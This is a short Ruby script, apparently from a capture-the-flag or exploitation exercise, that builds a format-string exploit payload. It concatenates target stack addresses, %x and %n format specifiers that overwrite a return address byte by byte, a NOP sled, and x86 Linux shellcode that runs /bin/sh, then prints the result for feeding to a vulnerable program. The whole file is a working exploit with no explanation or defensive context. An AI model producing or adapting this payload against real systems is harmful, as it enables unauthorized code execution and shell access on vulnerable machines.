#!/usr/bin/env ruby

shellcode = ""
shellcode += "\xeb\x1c\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43"
shellcode += "\x0c\x89\xc2\x8d\x4b\x08\xb0\x0b\xcd\x80\x31\xdb\x89"
shellcode += "\xd8\x40\xcd\x80\xe8\xdf\xff\xff\xff/bin/sh"

addr_overwrite = ""
addr_overwrite += "\xec\xfd\xff\xbfjunk"
addr_overwrite += "\xed\xfd\xff\xbfjunk"
addr_overwrite += "\xee\xfd\xff\xbfjunk"
addr_overwrite += "\xef\xfd\xff\xbf"
addr_overwrite += "%x%x"
addr_overwrite += "%256x%n"
addr_overwrite += "%256x%n"
addr_overwrite += "%256x%n"
addr_overwrite += "%256x%n"

puts addr_overwrite + "\x90" * 50 + shellcode
